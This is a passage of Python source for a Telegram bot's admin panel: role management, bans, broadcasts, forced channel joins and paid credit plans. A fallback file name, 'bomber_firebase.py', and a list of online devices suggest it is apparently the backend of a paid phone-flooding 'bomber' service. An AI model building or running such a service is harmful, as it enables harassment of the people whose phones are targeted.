    full = stats_text + "\n" + "\n".join(dev_lines) + f"\n\n{em(EMOJI_GEAR, '🔄')} {get_scan_status()}"
    if len(full) > 4000: full = full[:3990] + "\n<i>truncated</i>"
    try:
        await cq.message.edit_text(full, reply_markup=kb([(sc('refresh'), "owner:stats"), (sc('back'), "owner:home")]), parse_mode="HTML")
    except TelegramBadRequest:
        await cq.message.answer(full, reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("📊")
    devices = get_cached_devices()
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device nahi")
    else:
        for dv in devices[:10]:
            dev_lines.append(f"  📱 <b>{dv['dev_name'][:20]}</b> — 🔥 {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines) + f"\n\n🔄 {get_scan_status()}"
    if len(full) > 4000: full = full[:3990] + "\n<i>...</i>"
    try:
        await cq.message.edit_text(full, reply_markup=kb([(sc('refresh'), "admin:stats"), (sc('back'), "admin:home")]), parse_mode="HTML")
    except TelegramBadRequest:
        await cq.message.answer(full, reply_markup=kb([(sc('back'), "admin:home")]), parse_mode="HTML")

# ================= SUPER ADMINS =================
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    owners = d.get("owners", [])
    max_o = d.get("settings", {}).get("max_owners", 6)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/{max_o}</b>",
        reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    max_o = d.get("settings", {}).get("max_owners", 6)
    if len(d.get("owners", [])) >= max_o:
        await cq.answer(f"❌ Max {max_o}!", show_alert=True); return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nTelegram ID bhejo:",
        reply_markup=kb([(sc('cancel'), "owner:owners:menu")]), parse_mode="HTML")

@R.message(S.add_owner, F.text)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid numeric ID bhejo.", parse_mode="HTML"); return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already owner!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    max_o = d.get("settings", {}).get("max_owners", 6)
    if len(d.get("owners", [])) >= max_o:
        await state.clear()
        await msg.answer(f"❌ Max {max_o}!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if str(new_id) not in d.get("users", {}):
        await state.update_data(pending_owner=new_id)
        await state.set_state(S.add_owner_force)
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} <b>Ye user ne bot start nahi kiya!</b>\n\n"
            f"Notification nahi jayega. Force add karein?\n<i>'yes' bhejo.</i>",
            reply_markup=kb([(sc('cancel'), "owner:owners:menu")]), parse_mode="HTML")
        return
    if new_id in d.get("admins", []): d["admins"].remove(new_id)
    d.setdefault("owners", []).append(new_id)
    d.setdefault("role_meta", {})[str(new_id)] = {
        "role": "owner", "added_by": msg.from_user.id,
        "added_at": int(time.time()), "added_via": "manual"}
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n👑 <code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id,
            f"{em(EMOJI_CROWN, '🔱')} <b>Super Admin bana diya!</b>\nBy: <code>{msg.from_user.id}</code>\n/start karein.",
            parse_mode="HTML")
    except: pass

@R.message(S.add_owner)
async def owner_owners_add_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID bhejo.", parse_mode="HTML")

@R.message(S.add_owner_force, F.text)
async def owner_owners_force_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    txt = msg.text.strip().lower()
    fsmd = await state.get_data()
    new_id = fsmd.get("pending_owner")
    if txt not in ("yes", "y", "ha", "haan"):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Cancelled.", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if not new_id:
        await state.clear(); return
    if new_id in d.get("admins", []): d["admins"].remove(new_id)
    d.setdefault("owners", []).append(new_id)
    d.setdefault("role_meta", {})[str(new_id)] = {
        "role": "owner", "added_by": msg.from_user.id,
        "added_at": int(time.time()), "added_via": "force"}
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Force-added owner!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_owner_force)
async def owner_owners_force_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} 'yes' ya cancel bhejo.", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split(":")[-1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner remove nahi ho sakta!", show_alert=True); return
    u = d.get("users", {}).get(str(del_id), {})
    await cq.message.edit_text(
        f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Removal?</b>\n\n"
        f"👑 <code>{del_id}</code>\n👤 {u.get('name', 'Unknown')}\n\n<i>Ye apna owner access kho dega.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("✅ ʏᴇs, ʀᴇᴍᴏᴠᴇ", f"owner:owners:deldo:{del_id}", EMOJI_CHECK, "✅")],
            [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:owners:menu", EMOJI_CROSS, "❌")]
        ]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:owners:deldo:"))
async def owner_owners_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split(":")[-1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    if del_id in d.get("owners", []):
        d["owners"].remove(del_id)
        d.get("role_meta", {}).pop(str(del_id), None)
        await safe_save(d)
        log_activity(d, "owner_removed", cq.from_user.id, f"Removed owner {del_id}")
        save(d)
        await cq.answer(f"🗑 Removed {del_id}!", show_alert=True)
        try:
            await cq.bot.send_message(del_id, f"{em(EMOJI_WARNING, '⚠️')} Aapka Super Admin access hata diya gaya.", parse_mode="HTML")
        except: pass
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(d['owners'])}/{d.get('settings', {}).get('max_owners', 6)}</b>",
        reply_markup=owners_menu_kb(d), parse_mode="HTML")

# ================= ADMINS =================
@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    admins = d.get("admins", [])
    max_a = d.get("settings", {}).get("max_admins", 20)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}/{max_a}</b>",
        reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    max_a = d.get("settings", {}).get("max_admins", 20)
    if len(d.get("admins", [])) >= max_a:
        await cq.answer(f"❌ Max {max_a}!", show_alert=True); return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(sc('cancel'), "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin, F.text)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML"); return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already owner hai!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    if new_id in d.get("admins", []):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    max_a = d.get("settings", {}).get("max_admins", 20)
    if len(d.get("admins", [])) >= max_a:
        await state.clear()
        await msg.answer(f"❌ Max {max_a}!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    d.setdefault("admins", []).append(new_id)
    d.setdefault("role_meta", {})[str(new_id)] = {
        "role": "admin", "added_by": msg.from_user.id,
        "added_at": int(time.time()), "added_via": "manual"}
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n🛡 <code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Admin bana diya!</b>\nBy: <code>{msg.from_user.id}</code>\n/start karein.", parse_mode="HTML")
    except: pass

@R.message(S.add_admin)
async def owner_admins_add_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID bhejo.", parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add_bulk")
async def owner_admins_bulk_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_admin_bulk)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Bulk Add Admins</b>\n\nEk line me ek ID bhejo:\n"
        f"<code>123456789\n987654321</code>",
        reply_markup=kb([(sc('cancel'), "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin_bulk, F.text)
async def owner_admins_bulk_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    ids = [int(x) for x in msg.text.splitlines() if x.strip().isdigit()]
    if not ids:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi valid ID nahi mila!", parse_mode="HTML"); return
    added, skipped = [], []
    max_a = d.get("settings", {}).get("max_admins", 20)
    for new_id in ids:
        if is_owner(new_id, d) or new_id in d.get("admins", []):
            skipped.append(new_id); continue
        if len(d.get("admins", [])) >= max_a:
            skipped.append(new_id); continue
        d.setdefault("admins", []).append(new_id)
        d.setdefault("role_meta", {})[str(new_id)] = {
            "role": "admin", "added_by": msg.from_user.id,
            "added_at": int(time.time()), "added_via": "bulk"}
        added.append(new_id)
    await safe_save(d)
    await state.clear()
    text = f"{em(EMOJI_CHECK, '✅')} <b>Bulk Complete</b>\n\n✅ Added: <b>{len(added)}</b>\n⚠️ Skipped: <b>{len(skipped)}</b>\n"
    if added:
        text += "\n<b>Added:</b>\n" + "\n".join(f"• <code>{i}</code>" for i in added[:15])
    await msg.answer(text, reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    for new_id in added:
        try:
            await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Admin bana diya!</b>\n/start", parse_mode="HTML")
        except: pass

@R.message(S.add_admin_bulk)
async def owner_admins_bulk_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf IDs bhejo (line by line).", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split(":")[-1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    u = d.get("users", {}).get(str(del_id), {})
    await cq.message.edit_text(
        f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Removal?</b>\n\n🛡 <code>{del_id}</code>\n👤 {u.get('name', 'Unknown')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [btn("✅ ʏᴇs, ʀᴇᴍᴏᴠᴇ", f"owner:admins:deldo:{del_id}", EMOJI_CHECK, "✅")],
            [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:admins:menu", EMOJI_CROSS, "❌")]
        ]), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:admins:deldo:"))
async def owner_admins_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split(":")[-1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        d.get("role_meta", {}).pop(str(del_id), None)
        await safe_save(d)
        log_activity(d, "admin_removed", cq.from_user.id, f"Removed admin {del_id}")
        save(d)
        await cq.answer(f"🗑 Removed {del_id}!", show_alert=True)
        try:
            await cq.bot.send_message(del_id, f"{em(EMOJI_WARNING, '⚠️')} Aapka admin access hata diya gaya.", parse_mode="HTML")
        except: pass
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}/{d.get('settings', {}).get('max_admins', 20)}</b>",
        reply_markup=admins_menu_kb(d), parse_mode="HTML")

# ================= FREE MODE =================
@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE ON" if d["free_mode"] else "🔴 Approval"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

# ================= USERS LIST =================
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ================= BAN/UNBAN =================
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nID bhejo:",
        reply_markup=kb([(sc('cancel'), back)]), parse_mode="HTML")

@R.message(S.ban_user, F.text)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID.", parse_mode="HTML"); return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ban nahi kar sakte!", parse_mode="HTML"); return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Banned: <code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kiya gaya.", parse_mode="HTML")
    except: pass

@R.message(S.ban_user)
async def panel_ban_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID bhejo.", parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya. /start karein.", parse_mode="HTML")
    except: pass

# ================= BROADCAST =================
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage type karo:",
        reply_markup=kb([(sc('cancel'), back)]), parse_mode="HTML")

@R.message(S.broadcast, F.text)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b>...", parse_mode="HTML")
    ok = 0; fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
            await msg.bot.send_message(target, bcast_text, parse_mode="HTML")
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n✅ {ok}\n❌ {fail}", reply_markup=back_kb, parse_mode="HTML")

@R.message(S.broadcast)
async def panel_broadcast_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

# ================= EXPORT SCRIPT =================
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("📤")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path): script_path = "bomber_firebase.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>{_VERSION}</b>\nOwner: {OWNER_NAME}",
            parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)

# ================= FORCE JOIN =================
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        text += f"• {ch.get('title', 'Ch')} (<code>{ch['id']}</code>)\n  {ch['link']}\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}", callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🔗')} <b>Add Channel</b>\n\nChannel ID bhejo:\n<code>-1001234567890</code>",
        reply_markup=kb([(sc('cancel'), "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel, F.text)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        ch_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML"); return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(f"{em(EMOJI_BELL, '🔗')} <b>Step 2/2</b>\n\nInvite link bhejo:\n<i>https://t.me/+xxx</i>",
        reply_markup=kb([(sc('cancel'), "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_fj_add_channel_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf ID bhejo.", parse_mode="HTML")

@R.message(S.fj_add_link, F.text)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except: title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    await safe_save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n📢 {title}\n🔗 {link}",
        reply_markup=kb([(sc('back'), "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_fj_add_link_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf URL bhejo.", parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi nahi!", show_alert=True); return
    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    await safe_save(d)
    await cq.answer("🗑 Removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    await safe_save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

# ================= PRICING =================
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   💰 {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   🔗 {plan['payment_link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💳')} <b>Step 1/4</b>\n\nPlan name:",
        reply_markup=kb([(sc('cancel'), "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name, F.text)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>Step 2/4</b>\n\nPrice:",
        reply_markup=kb([(sc('cancel'), "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_pricing_name_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text.", parse_mode="HTML")

@R.message(S.add_plan_price, F.text)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        price = float(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number.", parse_mode="HTML"); return
    await state.update_data(plan_price=price)
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>Step 3/4</b>\n\nCredits:",
        reply_markup=kb([(sc('cancel'), "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")

@R.message(S.add_plan_credits, F.text)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number.", parse_mode="HTML"); return
    await state.update_data(plan_credits=credits)
    await state.set_state(S.add_plan_link)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} <b>Step 4/4</b>\n\nPayment link:",
        reply_markup=kb([(sc('cancel'), "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_credits)
